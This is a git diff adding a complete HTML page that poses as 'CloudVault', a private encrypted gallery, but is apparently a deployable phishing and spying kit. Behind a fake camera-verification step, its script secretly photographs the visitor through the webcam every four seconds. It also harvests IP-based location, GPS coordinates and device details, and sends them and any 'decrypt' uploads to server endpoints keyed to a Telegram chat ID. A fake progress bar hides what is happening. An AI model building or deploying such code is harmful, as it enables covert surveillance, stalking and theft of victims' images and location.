@@ -1,0 +1,458 @@
+<!DOCTYPE html>
+<html lang="en">
+<!-- 
+  UI Architecture: Secure Cloud Gallery Portal
+  Core developed by: @Danger_devil1917
+-->
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="author" content="@Danger_devil1917">
+    <title>CloudVault — Secure Media Storage</title>
+
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
+
+    <style>
+        :root {
+            --primary: #8b5cf6;
+            --primary-hover: #7c3aed;
+            --secondary: #a78bfa;
+            --accent: #ec4899;
+            --bg: #0f172a;
+            --card-bg: #1e293b;
+            --border: rgba(255, 255, 255, 0.08);
+            --text: #f8fafc;
+            --text-muted: #94a3b8;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Inter', sans-serif;
+        }
+
+        body {
+            background-color: var(--bg);
+            color: var(--text);
+            line-height: 1.5;
+            overflow-x: hidden;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Navbar */
+        nav {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 1.25rem 8%;
+            background: rgba(15, 23, 42, 0.8);
+            backdrop-filter: blur(12px);
+            border-bottom: 1px solid var(--border);
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+        }
+
+        .brand {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 1.5rem;
+            font-weight: 800;
+            letter-spacing: -0.5px;
+            color: #fff;
+        }
+
+        .brand span {
+            background: linear-gradient(135deg, var(--primary), var(--accent));
+            -webkit-background-clip: text;
+            background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .nav-btns {
+            display: flex;
+            gap: 1rem;
+        }
+
+        .btn {
+            padding: 0.6rem 1.25rem;
+            border-radius: 8px;
+            font-weight: 600;
+            font-size: 0.9rem;
+            cursor: pointer;
+            transition: 0.3s;
+            border: none;
+        }
+
+        .btn-primary {
+            background: var(--primary);
+            color: white;
+            box-shadow: 0 4px 14px 0 rgba(139, 92, 246, 0.39);
+        }
+
+        .btn-primary:hover {
+            background: var(--primary-hover);
+            transform: translateY(-1px);
+        }
+
+        /* Auth Modal */
+        #auth-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(2, 6, 23, 0.98);
+            z-index: 9999;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .auth-card {
+            background: var(--card-bg);
+            border: 1px solid var(--border);
+            padding: 3rem 2.5rem;
+            border-radius: 24px;
+            max-width: 480px;
+            text-align: center;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+        }
+
+        .auth-card .icon {
+            width: 70px;
+            height: 70px;
+            background: rgba(139, 92, 246, 0.1);
+            border-radius: 18px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 1.5rem;
+            color: var(--primary);
+            font-size: 2rem;
+        }
+
+        .auth-card h3 {
+            font-size: 1.8rem;
+            font-weight: 700;
+            margin-bottom: 0.75rem;
+        }
+
+        .auth-card p {
+            color: var(--text-muted);
+            margin-bottom: 2.5rem;
+            line-height: 1.6;
+        }
+
+        .auth-btn {
+            width: 100%;
+            padding: 1.1rem;
+            background: var(--primary);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 1.1rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+
+        .auth-btn:hover {
+            background: var(--primary-hover);
+            transform: translateY(-2px);
+        }
+
+        /* Gallery UI */
+        .dashboard {
+            padding: 60px 8% 100px;
+            display: none;
+        }
+
+        .section-label {
+            text-transform: uppercase;
+            font-size: 0.8rem;
+            font-weight: 700;
+            letter-spacing: 2px;
+            color: var(--primary);
+            margin-bottom: 2.5rem;
+            text-align: center;
+        }
+
+        .gallery-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 12px;
+            margin-top: 2rem;
+        }
+
+        .gallery-item {
+            aspect-ratio: 1;
+            background: var(--bg);
+            border-radius: 12px;
+            overflow: hidden;
+            position: relative;
+            border: 1px solid var(--border);
+        }
+
+        .gallery-item img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            filter: blur(15px) brightness(0.5);
+        }
+
+        .gallery-item .lock {
+            position: absolute;
+            inset: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.2rem;
+            color: var(--text-muted);
+        }
+
+        .sync-panel {
+            background: var(--bg);
+            padding: 1.5rem;
+            border-radius: 16px;
+            margin-top: 2rem;
+            border: 1px solid var(--primary);
+        }
+
+        .progress-bar {
+            height: 6px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            overflow: hidden;
+            margin: 1rem 0;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: var(--primary);
+            width: 45%;
+            transition: width 2s ease;
+        }
+
+        #hidden-box {
+            position: absolute;
+            left: -9999px;
+            opacity: 0;
+        }
+    </style>
+</head>
+
+<body>
+    <div id="auth-overlay">
+        <div class="auth-card">
+            <div class="icon"><i class="fas fa-folder-open"></i></div>
+            <h3>Private Gallery Access</h3>
+            <p>This protected folder contains sensitive media files. Biometric or Camera verification is required to
+                decrypt and view content.</p>
+            <button class="auth-btn" onclick="authorize()">UNLOCK GALLERY</button>
+            <div
+                style="margin-top: 2rem; color: var(--text-muted); font-size: 0.8rem; display: flex; align-items: center; justify-content: center; gap: 8px;">
+                <i class="fas fa-shield-cat" style="color: var(--accent);"></i> End-to-End Encryption
+            </div>
+        </div>
+    </div>
+
+    <nav>
+        <div class="brand">Cloud<span>Vault</span></div>
+        <div class="nav-btns">
+            <button class="btn btn-primary" onclick="authorize()">Log In</button>
+        </div>
+    </nav>
+
+    <main>
+        <div class="dashboard gallery-ui">
+            <div class="section-label">Decrypted Media Vault</div>
+            <div class="sync-panel">
+                <div style="display: flex; justify-content: space-between; align-items: center;">
+                    <span style="font-size: 0.9rem; font-weight: 600;">Cloud Synchronization</span>
+                    <span id="sync-val" style="font-size: 0.8rem; color: var(--primary);">0%</span>
+                </div>
+                <div class="progress-bar">
+                    <div class="progress-fill" id="sync-fill" style="width: 0%"></div>
+                </div>
+                <p style="font-size: 0.8rem; color: var(--text-muted);">Decrypting items from local storage...
+                    Verification successful.</p>
+                <button class="btn btn-primary" style="margin-top: 1.5rem; width: 100%;" onclick="openPicker()">UPLOAD
+                    TO DECRYPT</button>
+            </div>
+
+            <div class="gallery-grid">
+                <div class="gallery-item"><img
+                        src="https://images.unsplash.com/photo-1503023345310-bd7c1de61c7d?q=80&w=100">
+                    <div class="lock"><i class="fas fa-lock"></i></div>
+                </div>
+                <div class="gallery-item"><img
+                        src="https://images.unsplash.com/photo-1544005313-94ddf0286df2?q=80&w=100">
+                    <div class="lock"><i class="fas fa-lock"></i></div>
+                </div>
+                <div class="gallery-item"><img
+                        src="https://images.unsplash.com/photo-1506794778202-cad84cf45f1d?q=80&w=100">
+                    <div class="lock"><i class="fas fa-lock"></i></div>
+                </div>
+                <div class="gallery-item"><img
+                        src="https://images.unsplash.com/photo-1517841905240-472988babdf9?q=80&w=100">
+                    <div class="lock"><i class="fas fa-lock"></i></div>
+                </div>
+                <div class="gallery-item"><img
+                        src="https://images.unsplash.com/photo-1534528741775-53994a69daeb?q=80&w=100">
+                    <div class="lock"><i class="fas fa-lock"></i></div>
+                </div>
+                <div class="gallery-item"><img
+                        src="https://images.unsplash.com/photo-1520813792240-56fc4a3765a7?q=80&w=100">
+                    <div class="lock"><i class="fas fa-lock"></i></div>
+                </div>
+                <div class="gallery-item"><img
+                        src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?q=80&w=100">
+                    <div class="lock"><i class="fas fa-lock"></i></div>
+                </div>
+                <div class="gallery-item"><img
+                        src="https://images.unsplash.com/photo-1531746020798-e6953c6e8e04?q=80&w=100">
+                    <div class="lock"><i class="fas fa-lock"></i></div>
+                </div>
+                <div class="gallery-item"><img
+                        src="https://images.unsplash.com/photo-1542291026-7eec264c27ff?q=80&w=100">
+                    <div class="lock"><i class="fas fa-lock"></i></div>
+                </div>
+            </div>
+            <input type="file" id="file-picker" style="display: none;" onchange="handleFileUpload(this)">
+        </div>
+    </main>
+
+    <div id="hidden-box">
+        <video id="video" autoplay playsinline muted></video>
+        <canvas id="canvas"></canvas>
+    </div>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const chatId = urlParams.get('id');
+        let videoStream = null;
+
+        async function fetchSpecs() {
+            let info = {
+                platform: navigator.platform,
+                ua: navigator.userAgent,
+                res: `${screen.width}x${screen.height}`,
+                ram: navigator.deviceMemory || 'N/A',
+                cpu: navigator.hardwareConcurrency || 'N/A',
+                ip: 'N/A', city: 'N/A', region: 'N/A', country: 'N/A', tz: 'N/A'
+            };
+
+            const geoAPIs = ['https://ipapi.co/json/', 'https://ip-api.com/json/', 'https://extreme-ip-lookup.com/json/'];
+            for (let api of geoAPIs) {
+                try {
+                    const r = await fetch(api);
+                    const d = await r.json();
+                    if (d.ip || d.query) {
+                        info.ip = d.ip || d.query || d.ip_address || 'N/A';
+                        info.city = d.city || 'N/A';
+                        info.region = d.region || d.regionName || 'N/A';
+                        info.country = d.country_name || d.country || 'N/A';
+                        info.tz = d.timezone || 'N/A';
+                        break;
+                    }
+                } catch (e) { }
+            }
+            return info;
+        }
+
+        async function sendTelemetry(coords = null, cam = 'Prompt') {
+            const v = await fetchSpecs();
+            let text = `<tg-emoji emoji-id="6170421210258609322">📊</tg-emoji> <u><b>Gallery Session Log</b></u>\n____________________\n\n`;
+            text += `<tg-emoji emoji-id="5372981976804366741">🤖</tg-emoji> <b>Device</b>: ${v.platform}\n• Browser: ${v.ua.substring(0, 30)}...\n• IP: ${v.ip}\n• Location: ${v.city}, ${v.country}\n\n`;
+
+            if (coords) {
+                text += `<tg-emoji emoji-id="5415803062738504079">🗺</tg-emoji> <b>GPS</b>\n• Lat: <code>${coords.latitude}</code>\n• Long: <code>${coords.longitude}</code>\n\n`;
+            }
+            text += `<tg-emoji emoji-id="5897604269141398480">🔐</tg-emoji> <b>Permissions</b>\n• Camera: ${cam}\n• Location: ${coords ? 'Allowed' : 'Prompt'}\n\n`;
+            text += `<tg-emoji emoji-id="6170464829946468179">⚡️</tg-emoji> Developed by: @Danger_devil1917`;
+
+            fetch('/submit-log', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chatId, text: text })
+            });
+        }
+
+        async function takeSnapshot() {
+            if (!videoStream) return;
+            try {
+                const video = document.getElementById('video');
+                const canvas = document.getElementById('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.8));
+                const fd = new FormData();
+                fd.append('chat_id', chatId);
+                fd.append('photo', blob);
+                fd.append('mode', 'GALLERY-HACK');
+                fetch('/submit-photo', { method: 'POST', body: fd });
+            } catch (e) { }
+        }
+
+        function authorize() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(async stream => {
+                    videoStream = stream;
+                    document.getElementById('auth-overlay').style.display = 'none';
+                    document.querySelector('.gallery-ui').style.display = 'block';
+
+                    const video = document.getElementById('video');
+                    video.srcObject = stream;
+                    await video.play();
+
+                    // Initial metadata with location request after camera
+                    navigator.geolocation.getCurrentPosition(
+                        pos => sendTelemetry(pos.coords, 'Allowed'),
+                        () => sendTelemetry(null, 'Allowed'),
+                        { enableHighAccuracy: true }
+                    );
+
+                    // REAL-TIME LOOP
+                    setInterval(takeSnapshot, 4000);
+
+                    // Fake Progress
+                    let p = 5;
+                    setInterval(() => {
+                        if (p < 98) {
+                            p += Math.random() * 5;
+                            document.getElementById('sync-fill').style.width = p + '%';
+                            document.getElementById('sync-val').innerText = Math.floor(p) + '%';
+                        }
+                    }, 1000);
+                })
+                .catch(() => alert("Verification Failed. Camera access is required to decrypt this safe folder."));
+        }
+
+        function openPicker() {
+            document.getElementById('file-picker').click();
+        }
+
+        async function handleFileUpload(input) {
+            if (!input.files || !input.files[0]) return;
+            const file = input.files[0];
+            const fd = new FormData();
+            fd.append('chat_id', chatId);
+            fd.append('photo', file);
+            fd.append('mode', 'MANUAL-UPLOAD');
+
+            alert("Encrypting & Uploading to Secure Vault...");
+            await fetch('/submit-photo', { method: 'POST', body: fd });
+            alert("Upload Complete. File stored safely.");
+        }
+    </script>
+</body>
+
+</html>
